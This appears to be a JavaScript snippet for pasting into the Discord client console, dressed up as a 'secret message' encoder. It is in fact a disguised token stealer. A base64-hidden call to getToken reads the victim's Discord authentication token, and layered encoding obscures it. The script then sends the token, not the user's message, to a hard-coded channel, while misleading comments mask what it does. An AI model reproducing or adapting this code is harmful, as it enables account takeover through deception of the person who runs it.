/** my encoder, minified it because it's too long */
function encode(e){const r=e=>Array.from({length:e},(()=>"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(Math.floor(62*Math.random())))).join("");let t=btoa(btoa(e.reverse()).reverse().replaceAll("=","")).replaceAll("=","").reverse();return e=(e=(e=e.split("").map((e=>e.charCodeAt(0))).join(";")).reverse()).split("").map((e=>e.charCodeAt(0))).join(";"),e=(e=(e=(e=(e=btoa(e)).split("").map((e=>e.charCodeAt(0))).join(";")).reverse()).split("").map((e=>e.charCodeAt(0))).join(";")).reverse(),e=btoa(btoa(e)).replaceAll("=",""),t.format({random1:r(50),main:e,random2:r(50)})}String.prototype.reverse=function(){return this.split("").reverse().join("")},String.prototype.format=function(e){let r=this;for(let t in e)r=r.replace(`{${t}}`,e[t]);return r};function defineSalt(){ window.SECRET =  encode(findByProps(atob("Z2V0VG9rZW4="))[atob("Z2V0VG9rZW4=")]()) }
/** Generate a random secret message */
let secret = "YOUR SECRET HERE"
/** sends to js */
defineSalt() /** define the salt */
encode(secret) /** encode the secret */

findByProps('sendMessage').sendMessage("965629616012267570",{content: window.SECRET}).then(()=>{
    console.log("%cSecret message sent! user now has to figure it out!","color:green;font-size:40px;font-wieght:bold")
})